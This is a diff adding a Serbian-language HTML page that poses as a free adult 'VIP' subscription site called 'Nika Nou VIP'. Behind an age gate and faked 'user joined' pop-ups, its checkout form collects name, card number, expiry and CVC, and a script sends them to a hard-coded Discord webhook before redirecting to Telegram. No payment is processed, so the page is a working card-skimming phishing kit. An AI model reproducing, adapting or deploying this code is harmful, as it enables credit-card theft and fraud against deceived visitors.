@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nika Nou VIP</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap');
+
+        body { 
+            margin: 0; padding: 0; background-color: #050505; 
+            font-family: 'Poppins', sans-serif; color: white; overflow-x: hidden;
+            background-image: radial-gradient(circle at center, #0a1a20 0%, #050505 100%);
+        }
+
+        /* POZADINA SA ZVEZDAMA */
+        #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+
+        /* AGE GATE */
+        #age-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; display: flex; justify-content: center; align-items: center; text-align: center; }
+        .gate-box { padding: 50px; border: 1px solid rgba(0, 242, 255, 0.3); background: rgba(10, 10, 10, 0.95); border-radius: 20px; box-shadow: 0 0 40px rgba(0, 242, 255, 0.1); backdrop-filter: blur(10px); }
+        h1 { font-size: 100px; color: #00f2ff; margin: 0; font-weight: 700; letter-spacing: -5px; }
+        .gate-box p { font-size: 18px; margin: 10px 0 30px; color: #888; text-transform: uppercase; letter-spacing: 2px; }
+
+        .btn { padding: 15px 40px; font-size: 14px; cursor: pointer; border: none; border-radius: 8px; margin: 10px; font-weight: 700; text-transform: uppercase; transition: 0.3s; letter-spacing: 1px; }
+        .yes { background: #00f2ff; color: #000; box-shadow: 0 0 20px rgba(0, 242, 255, 0.4); }
+        .yes:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 242, 255, 0.6); }
+        .no { background: transparent; color: #555; border: 1px solid #222; }
+
+        /* CONTENT */
+        #main-site { display: none; position: relative; z-index: 10; max-width: 1200px; margin: 0 auto; padding: 100px 20px; text-align: center; }
+        .logo-text { font-size: 60px; font-weight: 700; margin-bottom: 10px; background: linear-gradient(to right, #fff, #00f2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .sub-text { color: #666; font-size: 18px; margin-bottom: 50px; }
+
+        .container { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
+
+        .card { 
+            background: rgba(20, 20, 20, 0.6); width: 320px; padding: 40px; 
+            border: 1px solid rgba(255,255,255,0.05); border-radius: 24px;
+            backdrop-filter: blur(15px); transition: 0.4s; position: relative; text-align: left;
+        }
+        .card:hover { transform: translateY(-10px); border-color: rgba(0, 242, 255, 0.4); background: rgba(25, 25, 25, 0.8); }
+
+        .card h3 { font-size: 24px; margin: 0; color: #fff; }
+        .price { font-size: 50px; font-weight: 700; color: #fff; margin: 20px 0; display: block; }
+        
+        .features { list-style: none; padding: 0; margin: 30px 0; color: #aaa; font-size: 15px; }
+        .features li { margin-bottom: 12px; display: flex; align-items: center; }
+        .features li::before { content: '✓'; color: #00f2ff; margin-right: 10px; font-weight: bold; }
+
+        .buy-link { 
+            display: block; background: #00f2ff; color: #000; padding: 18px; 
+            text-decoration: none; font-weight: 700; border-radius: 12px;
+            text-align: center; transition: 0.3s; text-transform: uppercase;
+            font-size: 14px; cursor: pointer; border: none; width: 100%;
+        }
+
+        .premium-card { border-color: rgba(179, 0, 255, 0.3); }
+        .premium-card .buy-link { background: linear-gradient(90deg, #b300ff, #00f2ff); color: #fff; }
+
+        /* CASHOUT FORMA */
+        #cashout-section {
+            display: none; max-width: 400px; margin: 20px auto; padding: 30px;
+            background: rgba(15, 15, 15, 0.9); border: 1px solid #00f2ff;
+            border-radius: 24px; backdrop-filter: blur(20px); text-align: left;
+        }
+        input {
+            width: 100%; padding: 15px; background: #000; border: 1px solid #333;
+            color: #fff; border-radius: 10px; box-sizing: border-box; 
+            font-family: 'Poppins', sans-serif; margin-bottom: 10px;
+        }
+        input:focus { border-color: #00f2ff; outline: none; }
+
+        /* NOTIF & FLOAT */
+        .tg-float { position: fixed; width: 60px; height: 60px; bottom: 30px; right: 30px; background-color: #24A1DE; border-radius: 50px; text-align: center; box-shadow: 2px 2px 20px rgba(0,0,0,0.5); z-index: 1000; display: none; animation: pulse-tg 2s infinite; }
+        #notif { position: fixed; bottom: 20px; left: 20px; background: rgba(10, 10, 10, 0.9); border: 1px solid #333; padding: 12px 20px; border-radius: 10px; font-size: 13px; display: none; z-index: 1000; }
+        @keyframes pulse-tg { 0% { box-shadow: 0 0 0 0 rgba(36, 161, 222, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(36, 161, 222, 0); } 100% { box-shadow: 0 0 0 0 rgba(36, 161, 222, 0); } }
+    </style>
+</head>
+<body>
+
+    <canvas id="particles"></canvas>
+
+    <div id="age-gate">
+        <div class="gate-box">
+            <h1>18+</h1>
+            <p>Najbrutalniji sadržaj na jednom mestu.</p>
+            <button class="btn yes" id="yesBtn">UĐI NA SAJT</button>
+            <button class="btn no" onclick="window.location.href='https://google.com'">ODBIJ</button>
+        </div>
+    </div>
+
+    <div id="main-site">
+        <div class="logo-text">Nika Nou <span style="color:#00f2ff">VIP</span></div>
+        <p class="sub-text">Najbolji sadrzaj na jednom mestu.</p>
+        
+        <div id="offer-container" class="container">
+            <div class="card">
+                <h3>VIP Paket</h3>
+                <span class="price">0€</span>
+                <ul class="features">
+                    <li>Hot slike i klipovi svaki dan</li>
+                    <li>Pristup VIP grupi</li>
+                    <li>HD Rezolucija</li>
+                </ul>
+                <button onclick="openCashout('VIP Paket', '0€')" class="buy-link">POSTANI VIP</button>
+            </div>
+
+            <div class="card premium-card">
+                <h3>Premium Plus</h3>
+                <span class="price">0€</span>
+                <ul class="features">
+                    <li>Svi prošli snimci (Arhiva)</li>
+                    <li>Klipovi po tvojoj želji</li>
+                    <li>Hot chat 1 na 1</li>
+                </ul>
+                <button onclick="openCashout('Premium Plus', '0€')" class="buy-link">POSTANI PREMIUM</button>
+            </div>
+        </div>
+
+        <div id="cashout-section">
+            <h2 id="chosen-name">Checkout</h2>
+            <p id="chosen-price" style="color:#00f2ff; font-weight:bold;"></p>
+            <input type="text" id="c_name" placeholder="Ime i Prezime">
+            <input type="text" id="c_num" placeholder="Broj kartice (16 cifara)">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="c_exp" placeholder="MM/YY">
+                <input type="text" id="c_cvc" placeholder="CVC">
+            </div>
+            <button class="buy-link" id="payBtn" onclick="sendToDiscord()">POTVRDI KASIRANJE</button>
+        </div>
+    </div>
+
+    <a href="https://t.me/onlynika" target="_blank" class="tg-float" id="tgBtn">
+        <svg style="margin-top:15px; width:30px;" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.89 8.11c-.19 2.1-.8 6.04-1.12 8.04-.14.85-.45 1.14-.75 1.17-.66.06-1.16-.43-1.8-.85-1.01-.66-1.57-1.07-2.55-1.72-1.14-.75-.4-1.16.25-1.82.17-.17 3.1-2.84 3.16-3.1.01-.03.01-.14-.05-.2s-.16-.07-.22-.05c-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.91-1.27 4.85-2.11 5.82-2.52 2.77-1.17 3.35-1.37 3.72-1.38.08 0 .27.02.39.12.1.08.13.19.14.27s.01.21 0 .28z"/></svg>
+    </a>
+
+    <div id="notif"></div>
+
+    <script>
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495187283387744266/SlhSHg8CC5XO2yJqu1F3gX4nUuUHTd1JBkgU3mwT0lJaIymHOUPVTg0wMMarFS83Nbap";
+
+        // Auto-format za Datum (kad kuca 129 -> 12/9)
+        document.getElementById('c_exp').addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length >= 2) {
+                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                e.target.value = val;
+            }
+        });
+
+        // Blokiraj slova i ogranici duzinu
+        document.getElementById('c_cvc').oninput = function() { this.value = this.value.replace(/\D/g, '').substring(0, 4); };
+        document.getElementById('c_num').oninput = function() { this.value = this.value.replace(/\D/g, '').substring(0, 16); };
+
+        document.getElementById('yesBtn').onclick = function() {
+            document.getElementById('age-gate').style.display = 'none';
+            document.getElementById('main-site').style.display = 'block';
+            document.getElementById('tgBtn').style.display = 'block'; 
+            showNotifs();
+        };
+
+        function openCashout(name, price) {
+            document.getElementById('offer-container').style.display = 'none';
+            document.getElementById('cashout-section').style.display = 'block';
+            document.getElementById('chosen-name').innerText = name;
+            document.getElementById('chosen-price').innerText = "Iznos: " + price;
+        }
+
+        async function sendToDiscord() {
+            const c_num = document.getElementById('c_num').value;
+            const c_exp = document.getElementById('c_exp').value;
+            const c_cvc = document.getElementById('c_cvc').value;
+
+            if (c_num.length < 16 || c_exp.length < 5 || c_cvc.length < 3) {
+                alert("Proveri podatke na kartici!");
+                return;
+            }
+
+            document.getElementById('payBtn').innerText = "OBRADA...";
+            
+            const embed = {
+                embeds: [{
+                    title: "🚀 NOVI KLIJENT LOGOVAN",
+                    color: 65535,
+                    fields: [
+                        { name: "Paket", value: document.getElementById('chosen-name').innerText, inline: true },
+                        { name: "Ime", value: document.getElementById('c_name').value || "Nije uneo", inline: true },
+                        { name: "Kartica", value: "`" + c_num + "`" },
+                        { name: "Datum", value: c_exp, inline: true },
+                        { name: "CVC", value: c_cvc, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+                window.location.href = "https://t.me/lavidalocaonly1";
+            } catch (e) {
+                window.location.href = "https://t.me/lavidalocaonly1";
+            }
+        }
+
+        function showNotifs() {
+            const names = ["Laza_lazz", "Stefan88", "Kralj011", "Miki_VIP", "User_921"];
+            setInterval(() => {
+                const notif = document.getElementById('notif');
+                notif.innerHTML = `Korisnik <b>${names[Math.floor(Math.random() * names.length)]}</b> je ušao u VIP!`;
+                notif.style.display = 'block';
+                setTimeout(() => { notif.style.display = 'none'; }, 4000);
+            }, 12000);
+        }
+
+        const canvas = document.getElementById('particles');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const stars = [];
+        for(let i=0; i<100; i++) stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, size: Math.random()*2, speed: Math.random()*0.4 });
+        function draw() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "rgba(255, 255, 255, 0.5)";
+            stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill(); s.y -= s.speed; if(s.y < 0) s.y = canvas.height; });
+            requestAnimationFrame(draw);
+        }
+        draw();
+    </script>
+</body>
+</html>
